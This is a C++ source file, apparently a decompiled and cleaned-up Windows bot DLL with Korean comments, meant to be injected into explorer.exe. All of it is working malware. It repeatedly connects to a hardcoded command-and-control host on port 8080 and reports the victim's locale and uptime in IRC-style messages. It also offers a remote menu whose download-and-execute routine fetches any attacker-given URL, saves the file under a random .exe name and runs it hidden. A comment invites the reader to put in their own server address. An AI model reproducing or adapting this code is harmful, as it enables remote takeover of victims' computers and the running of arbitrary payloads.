// kkkhost_Dll.cpp: DLL 응용 프로그램을 위해 내보낸 함수를 정의합니다.
//

#include "stdafx.h"

const char* Name = "oh~~~~~~~~~~~~~~~";
int WAITTIME = 22000;						//밀리세컨, 접속 시도 간격 
SOCKET s;
const char* aNickSIhS = "NICK [%s][%iH]%s\n";
const char* aTest = "#test";
char buf[256];
const char* sok8008 = "ns.sokpyunan.com";		//서버 주소, 자신의 주소를 넣으세요
const char* Module_Name = "explorer.exe";		//dll injection 대상 파일 
int hostport = 8080;

void *__stdcall rand_name_making(int a1)
{
	int i; // [esp+0h] [ebp-Ch]
	char Source[4]; // [esp+4h] [ebp-8h]
	void *Dst; // [esp+8h] [ebp-4h]

	Dst = malloc(a1 + 1);
	memset(Dst, 0, a1 + 1);
	srand((unsigned int)time(0));
	for (i = 0; i < a1; ++i)
	{
		*(DWORD *)Source = rand() % 26 + 97;
		strcat((char *)Dst, Source);
	}
	return Dst;
}

char *__stdcall DNS_query_url(char *Source)
{
	struct hostent *v2; // [esp+0h] [ebp-44h]
	char Dest[64]; // [esp+4h] [ebp-40h]

	if (Source)
		strcpy(Dest, Source);
	v2 = gethostbyname(Dest);
	while (!v2)
		Sleep(WAITTIME);
	return inet_ntoa(**(struct in_addr **)v2->h_addr_list);
}

int __stdcall dlexec_done(LPCSTR lpszUrl, char *Filename)		//26bb
{
	char Buffer[100]; // [esp+0h] [ebp-C8h]
	FILE *File; // [esp+64h] [ebp-64h]
	DWORD dwNumberOfBytesRead; // [esp+68h] [ebp-60h]
	struct _PROCESS_INFORMATION ProcessInformation; // [esp+6Ch] [ebp-5Ch]
	HINTERNET hFile; // [esp+7Ch] [ebp-4Ch]
	STARTUPINFOA startup_info;	// [esp+80h] [ebp-48h]
	HINTERNET hInternet; // [esp+C4h] [ebp-4h]

	memset(&startup_info, 0, 0x44u);
	memset(&ProcessInformation, 0, 0x10u);
	startup_info.cb = 0x44;
	startup_info.dwFlags = 1;
	startup_info.wShowWindow = 0;
	hInternet = InternetOpenA("wget", 0, 0, 0, 0);
	if (!hInternet)
		return 0;
	hFile = InternetOpenUrlA(hInternet, lpszUrl, 0, 0, 0, 0);		//5번째 인자로 받은 URL 
	if (!hFile)
		return 0;
	File = fopen(Filename, "wb");									//무작위 파일이름 
	if (!File)
		return 0;
	while (InternetReadFile(hFile, Buffer, 0x62u, &dwNumberOfBytesRead) && dwNumberOfBytesRead)
		fwrite(Buffer, 1u, dwNumberOfBytesRead, File);
	fclose(File);
	CreateProcessA(0, Filename, 0, 0, 1, 0x20u, 0, 0, (LPSTARTUPINFOA)&startup_info, &ProcessInformation);
	return 1;
}

int __stdcall DLL_Main(char Sel)
{
	char Dest[260];
	char recv_url_file[256];
	const char* file_url = "input url/filename ex) http://www.google.com/abc.exe\n";

	/*if(Sel=='1')
	{
	sprintf(buf, "PRIVMSG %s :Root -> [:] Executing pstore", aTest);
	send(s, buf, strlen(buf), 0);
	CreateThread(0, 0, StartAddress, 0, 0, 0);
	Sleep(3000);
	return 0;
	}*/
	if (Sel == '2')
	{
		send(s, file_url, strlen(file_url), 0);
		memset(recv_url_file, 0, 256);
		if (recv(s, recv_url_file, 255, 0)<1)
			return 2;

		strcpy(Dest, (const char *)rand_name_making(6));
		strcat(Dest, ".exe");
		if (dlexec_done(recv_url_file, Dest))	//URL은 인자로 받고 , 파일은 무작위.exe
		{
			sprintf(buf, "PRIVMSG %s :Executed : %s\n", aTest, recv_url_file);
			send(s, buf, strlen(buf), 0);
			return 0;
		}
		else
		{
			sprintf(buf, "PRIVMSG %s :Failed : %s\n", aTest, recv_url_file);
			send(s, buf, strlen(buf), 0);
			return 1;
		}
	}
	return 0;
}

void __stdcall Start_DLL_LOOP(LPVOID lpThreadParameter)
{
	struct sockaddr name; // [esp+4h] [ebp-4B8h]
	char Str[256]; // [esp+14h] [ebp-4A8h]
	char Dest[512]; // [esp+114h] [ebp-3A8h]
	HANDLE v13; // [esp+314h] [ebp-1A8h]
	CHAR LCData[12]; // [esp+318h] [ebp-1A4h]
	DWORD v15; // [esp+324h] [ebp-198h]
	struct WSAData WSAData; // [esp+328h] [ebp-194h]
	const char* menu = "SELECT number 1) SHOW PROTECTED STORAGE 2) upload & exec 3) Ping\n";
	char nick_name[10] = { 0, };
	int result = 0;

	//v13 = CreateMutexA(0, 0, Name);		//하나의 문자열에 하나만 실행하는 함수, 중복 실행을 방지하기 위해 사용
	//if (GetLastError() == 183)			//중복실행 됐을시에 발생하는 error code "ERROR_ALREADY_EXISTS"
	//	ExitProcess(0);
	strcpy(nick_name, (char*)rand_name_making(8));
	while (1)
	{
		WSAStartup(1u, &WSAData);
		*(DWORD *)&name.sa_data[2] = inet_addr((const char *)DNS_query_url((char*)sok8008));
		name.sa_family = 2;
		*(WORD *)name.sa_data = htons(hostport);
		s = socket(2, 1, 6);	//AF_INET,SOCK_STREAM
		while (connect(s, &name, 16))
			Sleep(WAITTIME);			//22초마다 접속 연결 시도 

		while (1)
		{
			GetLocaleInfoA(0x800u, 7u, LCData, 10);
			v15 = GetTickCount() / 0x3E8 / 0xE10;
			sprintf(Dest, aNickSIhS, LCData, v15, nick_name);	//"NICK [%s][%iH]%s\n"
			send(s, Dest, strlen(Dest), 0);
			sprintf(Dest, "%s", menu);
			send(s, Dest, strlen(Dest), 0);
			Sleep(0x1F4u);		//0.5초간 딜레이

			memset(Dest, 0, 0x200u);
			if (recv(s, Dest, 511, 0)<1)
				break;
			if (Dest[0] == '3')
			{
				sprintf(Str, "%s", "Pong\n");
				send(s, Str, strlen(Str), 0);
				Sleep(1000);
			}
			if (Dest[0] == '1' || Dest[0] == '2')
			{
				result = DLL_Main(Dest[0]);
			}
			if (result == 2) {
				result = 0;
				break;
			}
		}
		WSACleanup();
		closesocket(s);
	}
}
